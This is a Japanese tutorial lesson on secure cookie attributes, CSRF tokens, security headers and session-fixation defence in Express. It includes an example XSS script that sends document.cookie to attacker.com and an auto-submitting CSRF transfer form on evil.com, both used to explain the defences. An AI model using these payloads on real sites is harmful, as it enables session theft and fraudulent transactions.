# Lesson 05: セキュアなクッキー設定

## 📋 概要

このレッスンでは、プロダクション環境で必須となるセキュアなクッキー設定を学びます。HttpOnly、Secure、SameSite 属性を理解し、CSRF、XSS、セッションハイジャックなどの攻撃から保護する方法を実装します。

## 🎯 学習目標

- セキュリティ関連のクッキー属性を理解する
- CSRF、XSS攻撃の仕組みと対策を学ぶ
- プロダクション環境のベストプラクティスを習得する
- セキュリティヘッダーの設定方法を学ぶ

## 🔐 セキュリティ属性の詳細

### 1. HttpOnly 属性

**目的**: XSS (Cross-Site Scripting) 攻撃からの保護

```javascript
res.cookie('sessionId', value, {
  httpOnly: true // JavaScript から読み取り不可
});
```

**動作**:
```javascript
// ❌ JavaScript からアクセスできない
console.log(document.cookie); // sessionId は表示されない

// ✅ サーバーには自動的に送信される
```

**攻撃シナリオ（HttpOnly なし）**:
```html
<!-- 攻撃者が注入した悪意のあるスクリプト -->
<script>
  // セッションIDを盗む
  const sessionId = document.cookie;
  fetch('https://attacker.com/steal?data=' + sessionId);
</script>
```

**対策（HttpOnly あり）**:
```javascript
// document.cookie でセッション ID が読み取れない
// → XSS 攻撃の影響を大幅に軽減
```

### 2. Secure 属性

**目的**: 中間者攻撃（Man-in-the-Middle）からの保護

```javascript
res.cookie('sessionId', value, {
  secure: true // HTTPS のみで送信
});
```

**動作**:
```
HTTP リクエスト:  クッキーを送信しない ❌
HTTPS リクエスト: クッキーを送信する ✅
```

**攻撃シナリオ（Secure なし）**:
```
ユーザー → HTTP → 攻撃者 → サーバー
         │
         └─ クッキーを盗聴される
```

**対策（Secure あり）**:
```
ユーザー → HTTPS（暗号化）→ サーバー
         └─ クッキーが暗号化されて送信
```

### 3. SameSite 属性

**目的**: CSRF (Cross-Site Request Forgery) 攻撃からの保護

```javascript
res.cookie('sessionId', value, {
  sameSite: 'strict' // または 'lax', 'none'
});
```

**3つの値の違い**:

#### Strict（最も厳格）
```javascript
sameSite: 'strict'

// ✅ 同じサイトからのリクエスト → クッキー送信
// ❌ 他のサイトからのリンク → クッキー送信しない
```

**例**:
```html
<!-- example.com にログイン中 -->

<!-- ✅ example.com 内のリンク → ログイン状態維持 -->
<a href="/profile">プロフィール</a>

<!-- ❌ external.com からのリンク → ログアウト状態 -->
<!-- external.com のページ: -->
<a href="https://example.com/profile">プロフィール</a>
```

#### Lax（バランス型、デフォルト）
```javascript
sameSite: 'lax'

// ✅ 同じサイトからのリクエスト → クッキー送信
// ✅ 他サイトからのトップレベルナビゲーション（GET） → クッキー送信
// ❌ 他サイトからのサブリソース（POST、iframe） → クッキー送信しない
```

**例**:
```html
<!-- ✅ 外部サイトからのリンク（GET） → ログイン状態維持 -->
<a href="https://example.com/profile">プロフィール</a>

<!-- ❌ 外部サイトからのフォーム（POST） → クッキー送信しない -->
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <button>送金</button>
</form>
```

#### None（制限なし）
```javascript
sameSite: 'none',
secure: true // None の場合 Secure は必須

// ✅ すべてのクロスサイトリクエストでクッキー送信
// ⚠️  CSRF のリスクあり
```

**使用例**: iframe での埋め込み、サードパーティ認証

### CSRF 攻撃の詳細

**攻撃シナリオ**:
```html
<!-- 悪意のあるサイト evil.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

**ユーザーの動作**:
1. bank.com にログイン（セッション確立）
2. evil.com にアクセス（別タブで）
3. 自動的にフォームが送信される
4. bank.com のセッションクッキーも一緒に送信される
5. 攻撃者に送金されてしまう

**SameSite=lax/strict での防御**:
```javascript
// SameSite 属性により、evil.com からのリクエストに
// セッションクッキーが送信されない
// → CSRF 攻撃が失敗
```

## ✅ ベストプラクティス

### プロダクション環境の推奨設定

```javascript
// 最もセキュアな設定
res.cookie('sessionId', sessionId, {
  httpOnly: true,        // XSS 対策（必須）
  secure: true,          // HTTPS のみ（必須）
  sameSite: 'strict',    // CSRF 対策（最も厳格）
  maxAge: 3600000,       // 1時間（短め推奨）
  path: '/',             // パス指定
  domain: undefined      // サブドメイン共有しない
});
```

### 環境別の設定

```javascript
const isProduction = process.env.NODE_ENV === 'production';

res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: isProduction,              // 本番: true, 開発: false
  sameSite: isProduction ? 'strict' : 'lax',
  maxAge: isProduction ? 3600000 : 86400000 // 本番: 1h, 開発: 24h
});
```

### 追加のセキュリティ対策

#### 1. CSRF トークン（二重送信クッキー）

```javascript
// SameSite が使えない場合のフォールバック
const csrfToken = crypto.randomBytes(32).toString('hex');

// クッキーに保存
res.cookie('csrf-token', csrfToken, {
  httpOnly: false, // JavaScript から読み取り可能にする
  sameSite: 'strict'
});

// フォームに埋め込む
<input type="hidden" name="csrf-token" value="${csrfToken}">

// サーバーで検証
if (req.body.csrfToken !== req.cookies['csrf-token']) {
  return res.status(403).json({ error: 'Invalid CSRF token' });
}
```

#### 2. セキュリティヘッダー

```javascript
// Helmet ミドルウェアの使用
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

#### 3. セッション固定攻撃の防止

```javascript
// ログイン時に新しいセッション ID を生成
app.post('/login', (req, res) => {
  // 古いセッションを破棄
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    sessions.delete(oldSessionId);
  }

  // 新しいセッション ID を生成
  const newSessionId = generateSessionId();
  sessions.set(newSessionId, userData);

  res.cookie('sessionId', newSessionId, secureOptions);
});
```

## 🎯 実装例

```javascript
import express from 'express';
import helmet from 'helmet';
import crypto from 'crypto';

const app = express();

// セキュリティヘッダー
app.use(helmet());

// CSRF 対策ミドルウェア
function csrfProtection(req, res, next) {
  if (req.method === 'GET') {
    // CSRF トークンを生成
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf-token', token, {
      httpOnly: false,
      sameSite: 'strict'
    });
    req.csrfToken = token;
    return next();
  }

  // POST/PUT/DELETE の場合、トークンを検証
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'] || req.body.csrfToken;

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({
      success: false,
      message: 'Invalid CSRF token'
    });
  }

  next();
}

// 本番環境かどうか
const isProduction = process.env.NODE_ENV === 'production';

// セキュアなクッキー設定
const cookieOptions = {
  httpOnly: true,
  secure: isProduction,
  sameSite: 'strict',
  maxAge: 3600000,
  path: '/'
};

app.post('/api/login', (req, res) => {
  // 認証...

  res.cookie('sessionId', sessionId, cookieOptions);
  res.json({ success: true });
});
```

## 📝 演習問題

### 初級
1. HttpOnly、Secure、SameSite 属性を全て有効にしてください
2. CSRF トークンを実装してください

### 中級
3. 環境別にクッキー設定を切り替える機能を追加してください
4. セキュリティヘッダーを追加してください

### 上級
5. セッション固定攻撃への対策を実装してください
6. Content Security Policy を設定してください

## 🔄 次のステップ

次は **[Lesson 06: リフレッシュトークン](../06-refresh-tokens/README.md)** でトークンの更新戦略を学びます。
